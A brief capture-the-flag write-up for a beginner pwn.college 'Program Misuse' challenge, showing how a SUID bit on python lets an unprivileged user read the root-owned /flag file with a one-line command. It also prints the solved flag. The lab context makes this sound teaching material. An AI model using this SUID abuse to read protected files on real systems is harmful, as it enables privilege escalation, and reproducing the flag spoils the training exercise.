---
layout: page
title: "Challenge Name: python"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Beginner  
**Date**: 2025-07-16  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/python`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/python
```

Output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/python
```

- The `s` in `-rws` indicates it's a SUID binary.
- `python` runs with **root privileges**.

## 🚀 Exploitation

We can simply use `python` to open and read contents of /flag to reveal the flag

```bash
python -c 'print(open("/flag").read())'
```

Output:
```
pwn.college{AQMckT_nE44QxyTRplhesZU7x-T.dRDOxwSM0IzMyEzW}
```
